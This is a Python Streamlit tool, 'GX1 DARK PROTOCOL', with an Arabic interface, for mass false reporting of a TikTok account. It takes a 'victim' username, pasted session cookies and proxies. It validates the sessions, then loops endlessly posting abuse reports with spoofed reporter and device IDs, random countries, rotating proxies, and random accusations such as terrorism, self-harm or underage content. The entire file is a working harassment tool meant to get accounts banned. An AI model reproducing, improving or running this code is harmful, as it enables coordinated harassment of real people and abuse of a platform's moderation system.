import streamlit as st
import re
import requests
import time
import sys
import os
import random
from os import path
from concurrent.futures import ThreadPoolExecutor, as_completed
from user_agent import generate_user_agent

# --- إعدادات واجهة المتصفح ---
st.set_page_config(page_title="GX1 DARK PROTOCOL", page_icon="💀", layout="wide")

# تصميم الواجهة بالألوان الأصلية (أحمر، أخضر، أسود)
st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stButton>button { width: 100%; border: 2px solid #ff0000; background-color: #000000; color: #ff0000; font-weight: bold; height: 3em; }
    .stButton>button:hover { background-color: #ff0000; color: #000000; border: 2px solid #ffffff; }
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div { background-color: #111111 !important; color: #00ff00 !important; border: 1px solid #ff0000 !important; }
    label { color: #ffffff !important; font-size: 1.1rem; }
    .stMetric { background-color: #111111; border: 1px solid #ff0000; padding: 10px; border-radius: 10px; }
    </style>
    """, unsafe_allow_html=True)

# عرض صورة البانر الأصلية
st.markdown(f"""
    <div style="border: 5px solid #ff0000; padding: 10px; border-radius: 15px; text-align: center; background-color: #050505; margin-bottom: 20px;">
        <img src="https://files.catbox.moe/8z2xdh.jpg" style="width: 100%; max-width: 800px; border-radius: 10px;">
        <h1 style="color: #ff0000; text-shadow: 2px 2px #550000;">💀 GX1 - DARK PROTOCOL 💀</h1>
    </div>
    """, unsafe_allow_html=True)

# --- قائمة الأجهزة (50 جهاز) - لم يتم حذف حرف واحد ---
devices = [
    {"reporter_id": "7024230440182809606", "device_id": "7008218736944907778"},
    {"reporter_id": "27568146", "device_id": "7008218736944907778"},
    {"reporter_id": "6955107540677968897", "device_id": "7034110346035136001"},
    {"reporter_id": "310430566162530304", "device_id": "7034110346035136001"},
    {"reporter_id": "7242379992225940485", "device_id": "7449373206865561094"},
    {"reporter_id": "7024230440182809607", "device_id": "7008218736944907779"},
    {"reporter_id": "27568147", "device_id": "7008218736944907779"},
    {"reporter_id": "6955107540677968898", "device_id": "7034110346035136002"},
    {"reporter_id": "310430566162530305", "device_id": "7034110346035136002"},
    {"reporter_id": "7242379992225940486", "device_id": "7449373206865561095"},
    {"reporter_id": "7024230440182809608", "device_id": "7008218736944907780"},
    {"reporter_id": "27568148", "device_id": "7008218736944907780"},
    {"reporter_id": "6955107540677968899", "device_id": "7034110346035136003"},
    {"reporter_id": "310430566162530306", "device_id": "7034110346035136003"},
    {"reporter_id": "7242379992225940487", "device_id": "7449373206865561096"},
    {"reporter_id": "7024230440182809609", "device_id": "7008218736944907781"},
    {"reporter_id": "27568149", "device_id": "7008218736944907781"},
    {"reporter_id": "6955107540677968900", "device_id": "7034110346035136004"},
    {"reporter_id": "310430566162530307", "device_id": "7034110346035136004"},
    {"reporter_id": "7242379992225940488", "device_id": "7449373206865561097"},
    {"reporter_id": "7024230440182809610", "device_id": "7008218736944907782"},
    {"reporter_id": "27568150", "device_id": "7008218736944907782"},
    {"reporter_id": "6955107540677968901", "device_id": "7034110346035136005"},
    {"reporter_id": "310430566162530308", "device_id": "7034110346035136005"},
    {"reporter_id": "7242379992225940489", "device_id": "7449373206865561098"},
    {"reporter_id": "7024230440182809611", "device_id": "7008218736944907783"},
    {"reporter_id": "27568151", "device_id": "7008218736944907783"},
    {"reporter_id": "6955107540677968902", "device_id": "7034110346035136006"},
    {"reporter_id": "310430566162530309", "device_id": "7034110346035136006"},
    {"reporter_id": "7242379992225940490", "device_id": "7449373206865561099"},
    {"reporter_id": "7024230440182809612", "device_id": "7008218736944907784"},
    {"reporter_id": "27568152", "device_id": "7008218736944907784"},
    {"reporter_id": "6955107540677968903", "device_id": "7034110346035136007"},
    {"reporter_id": "310430566162530310", "device_id": "7034110346035136007"},
    {"reporter_id": "7242379992225940491", "device_id": "7449373206865561100"},
    {"reporter_id": "7024230440182809613", "device_id": "7008218736944907785"},
    {"reporter_id": "27568153", "device_id": "7008218736944907785"},
    {"reporter_id": "6955107540677968904", "device_id": "7034110346035136008"},
    {"reporter_id": "310430566162530311", "device_id": "7034110346035136008"},
    {"reporter_id": "7242379992225940492", "device_id": "7449373206865561101"},
    {"reporter_id": "7024230440182809614", "device_id": "7008218736944907786"},
    {"reporter_id": "27568154", "device_id": "7008218736944907786"},
    {"reporter_id": "6955107540677968905", "device_id": "7034110346035136009"},
    {"reporter_id": "310430566162530312", "device_id": "7034110346035136009"},
    {"reporter_id": "7242379992225940493", "device_id": "7449373206865561102"},
    {"reporter_id": "7024230440182809615", "device_id": "7008218736944907787"},
    {"reporter_id": "27568155", "device_id": "7008218736944907787"},
    {"reporter_id": "6955107540677968906", "device_id": "7034110346035136010"},
    {"reporter_id": "310430566162530313", "device_id": "7034110346035136010"},
    {"reporter_id": "7242379992225940494", "device_id": "7449373206865561103"}
]

# --- قائمة الدول (50 دولة) - لم يتم حذف حرف واحد ---
countries = [
    "SA", "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "BR",
    "RU", "CN", "JP", "KR", "IN", "ID", "TR", "NL", "SE", "NO",
    "DK", "FI", "PL", "UA", "CZ", "RO", "HU", "GR", "PT", "BE",
    "CH", "AT", "IE", "SG", "MY", "TH", "VN", "PH", "MX", "AR",
    "CL", "CO", "PE", "ZA", "EG", "NG", "KE", "MA", "DZ", "AE"
]

expected_response = '"status_code":0,"status_msg":"Thanks for your feedback"'

# --- جميع الدوال الأصلية كما هي ---

def format_proxy(proxy):
    proxy = proxy.strip()
    if not (proxy.startswith("http://") or proxy.startswith("https://") or
            proxy.startswith("socks5://") or proxy.startswith("socks4://")):
        return "http://" + proxy
    return proxy

def get_report_params(r_type, target_ID, session):
    base_url = 'https://www.tiktok.com/aweme/v1/aweme/feedback/'
    device = random.choice(devices)
    country = random.choice(countries)
    common = (f"?aid=1233&app_name=tiktok_web&device_platform=web_mobile"
              f"&region={country}&priority_region={country}&os=ios&"
              f"cookie_enabled=true&screen_width=375&screen_height=667&"
              f"browser_language=en-US&browser_platform=iPhone&"
              f"browser_name=Mozilla&browser_version=5.0+(iPhone;+CPU+iPhone+OS+15_1+like+Mac+OS+X)+"
              f"AppleWebKit/605.1.15+(KHTML,+like+Gecko)+InspectBrowser&"
              f"browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh&"
              f"is_page_visible=true&focus_state=true&is_fullscreen=false")

    params = {1: {"reason": "399"}, 2: {"reason": "310"}, 3: {"reason": "317"}, 4: {"reason": "3142"}, 5: {"reason": "306"}, 6: {"reason": "308"}, 7: {"reason": "3011"}, 8: {"reason": "3052"}, 9: {"reason": "3072"}, 10: {"reason": "303"}, 14: {"reason": "9004"}, 15: {"reason": "90064"}, 16: {"reason": "9010"}}
    p = params.get(r_type, {"reason": "310"})
    url = f"{base_url}{common}&history_len=14&reason={p['reason']}&report_type=user&object_id={target_ID}&owner_id={target_ID}&target={target_ID}&reporter_id={device['reporter_id']}&current_region={country}"
    headers = {'Accept': '*/*', 'Cookie': 'sessionid=' + session, 'User-Agent': generate_user_agent()}
    data = {"object_id": target_ID, "owner_id": target_ID, "report_type": "user", "target": target_ID}
    return url, headers, data

def validate_session(session):
    check_url = 'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?aid=1233'
    headers = {'User-Agent': generate_user_agent(), 'Cookie': 'sessionid=' + session}
    try:
        resp = requests.get(check_url, headers=headers, timeout=5)
        return 'user_id' in resp.text and "expired" not in resp.text
    except: return False

def get_target_id(username):
    headers = {'User-Agent': generate_user_agent(), 'Host': 'www.tiktok.com'}
    try:
        req = requests.get(f'https://www.tiktok.com/@{username}?lang=en', headers=headers)
        return re.findall(r'"user":{"id":"(.*?)"', req.text)[0]
    except: return None

# --- واجهة Streamlit الجديدة المطلوبة ---

st.sidebar.title("👹 DARK CONTROL")
report_options = {
    "1 - الإبلاغ عن محتوى": 1, "2 - البريد العشوائي/المضايقة": 2, "3 - دون السن القانونية": 3,
    "4 - معلومات مزيفة": 4, "5 - خطاب كراهية": 5, "6 - محتوى إباحي": 6, "7 - منظمات إرهابية": 7,
    "8 - إيذاء النفس": 8, "9 - مضايقة شخص": 9, "10 - عنف": 10, "12 - بلاغات عشوائية": 12,
    "13 - بلاغات عبر بروكسي": 13, "14 - احتيال/نصب": 14, "15 - تحديات خطيرة": 15, "16 - الإبلاغ عن سبام": 16
}

selected_label = st.sidebar.selectbox("اختر نوع البلاغ", list(report_options.keys()))
option = report_options[selected_label]

target_user = st.sidebar.text_input("يوزر الضحية (بدون @)")
delay_val = st.sidebar.slider("التأخير (ثواني)", 0, 10, 2)

col1, col2 = st.columns(2)
with col1:
    sessions_input = st.text_area("📋 ألصق السيزنات هنا (كل واحد في سطر)", height=200)
with col2:
    proxies_input = st.text_area("🌐 ألصق البروكسيات هنا (كل واحد في سطر)", height=200)

if st.button("🚀 EXECUTE DARK PROTOCOL"):
    if not target_user or not sessions_input:
        st.error("❌ أدخل يوزر الضحية والسيزنات أولاً!")
    else:
        sessions_list = [s.strip() for s in sessions_input.split('\n') if s.strip()]
        proxies_list = [format_proxy(p) for p in proxies_input.split('\n') if p.strip()]
        
        st.info("🔍 جاري فحص الهدف والتحقق من السيزنات...")
        target_id = get_target_id(target_user)
        
        if not target_id:
            st.error("❌ تعذر العثور على Target ID!")
        else:
            valid_sessions = [s for s in sessions_list if validate_session(s)]
            if not valid_sessions:
                st.error("❌ لا توجد سيزنات صالحة!")
            else:
                st.success(f"🎯 الهدف: {target_id} | السيزنات الجاهزة: {len(valid_sessions)}")
                
                # إحصائيات مباشرة
                sc1, sc2 = st.columns(2)
                success_metric = sc1.metric("SUCCESS ✅", 0)
                fail_metric = sc2.metric("FAILED ❌", 0)
                log_box = st.expander("سجل الهجوم المباشر", expanded=True)
                
                s_count, f_count = 0, 0
                random_mode = option in [12, 13]

                # حلقة التنفيذ الأصلية
                try:
                    while True:
                        for session in valid_sessions:
                            current_type = random.choice([1,2,3,4,5,6,7,8,9,10,14,15,16]) if random_mode else option
                            url, headers, data = get_report_params(current_type, target_id, session)
                            
                            px = None
                            if proxies_list:
                                p_choice = random.choice(proxies_list)
                                px = {"http": p_choice, "https": p_choice}
                            
                            try:
                                r = requests.post(url, headers=headers, data=data, proxies=px, timeout=10)
                                if expected_response in r.text:
                                    s_count += 1
                                    log_box.write(f"✅ تم الإرسال: {session[:10]}... | النوع: {current_type}")
                                else:
                                    f_count += 1
                                    log_box.write(f"❌ فشل الاستجابة: {session[:10]}...")
                            except:
                                f_count += 1
                                log_box.write(f"⚠️ خطأ اتصال بالسيزن: {session[:10]}...")
                            
                            success_metric.metric("SUCCESS ✅", s_count)
                            fail_metric.metric("FAILED ❌", f_count)
                            time.sleep(delay_val)
                except Exception as e:
                    st.warning("تم إيقاف البروتوكول.")

